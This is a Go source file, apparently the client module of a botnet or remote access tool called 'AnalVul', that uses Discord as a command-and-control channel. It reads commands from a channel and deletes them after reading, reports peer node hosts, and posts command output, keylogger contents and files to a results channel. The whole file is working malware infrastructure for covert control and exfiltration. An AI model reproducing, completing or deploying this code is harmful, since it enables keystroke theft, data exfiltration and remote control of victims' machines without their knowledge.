package client

import (
	"AnalVul/Constantes"
	messages "AnalVul/packages"
	"fmt"
	"github.com/bwmarrin/discordgo"
	"log"
	"os"
	"strconv"
)

func (this *Client) connectDiscord() {
	var err error
	this.discordBot, err = discordgo.New("Bot " + Constantes.TOKEN)
	if err != nil {
		fmt.Println("Erreur lors de la création de la session Discord,", err)
		return
	}
	err = this.discordBot.Open()
	if err != nil {
		fmt.Println("Erreur lors de l'ouverture de la connexion,", err)
		return
	}
}

func (this *Client) fetchMessages() []string {
	messages := make([]string, 0)
	if this.discordBot == nil {
		return messages
	}
	messages_, err := fetchMessages(this.discordBot, Constantes.CHANNEL_COMMANDS, 100)
	if err != nil {
		return messages
	}
	for _, msg := range messages_ {
		messages = append(messages, msg.Content)
		this.discordBot.ChannelMessageDelete(Constantes.CHANNEL_COMMANDS, msg.ID)
	}
	return messages
}

func (this *Client) uploadKnownNodesToDiscord() {
	this.nodeSema.Acquire()
	this.knownNodes = append(this.knownNodes, &messages.Node{
		Id:   this.id,
		Host: this.addr,
	})
	for _, node := range this.knownNodes {
		this.discordBot.ChannelMessageSend(Constantes.CHANNEL_NODES, ""+strconv.FormatInt(node.Id, 10)+" "+node.Host)
	}
	this.knownNodes = make([]*messages.Node, 0)
	this.nodeSema.Release()
}

func fetchMessages(s *discordgo.Session, channelID string, limit int) ([]*discordgo.Message, error) {
	messages, err := s.ChannelMessages(channelID, limit, "", "", "")
	if err != nil {
		return nil, err
	}
	return messages, nil
}

func (this *Client) UploadCommandResultToDiscord(uuid string, content string) {
	myContent := "# Résultat de la commande " + uuid + "\n```" + content + "```"
	this.discordBot.ChannelMessageSend(Constantes.CHANNEL_RETOUR, myContent)
}

func (this *Client) UploadKeyLoggerToDiscord(content string) {
	myContent := "# Contenue du key logger: \n```" + content + "```"
	this.discordBot.ChannelMessageSend(Constantes.CHANNEL_RETOUR, myContent)
}

func (this *Client) UploadFileToWEB(name string, content []byte, uuid string) {
	os.Mkdir("./recompiled_files", 777)
	WriteBytesToFile(name, content)
	ff, err := os.Open(name)
	if err != nil {
		log.Println("Erreur lors de l'ouverture du fichier : %v", err)
		return
	}
	this.discordBot.ChannelFileSendWithMessage(Constantes.CHANNEL_RETOUR, "# Résultat de la commande "+uuid, name, ff)
	ff.Close()
	os.RemoveAll("./recompiled_files")
}
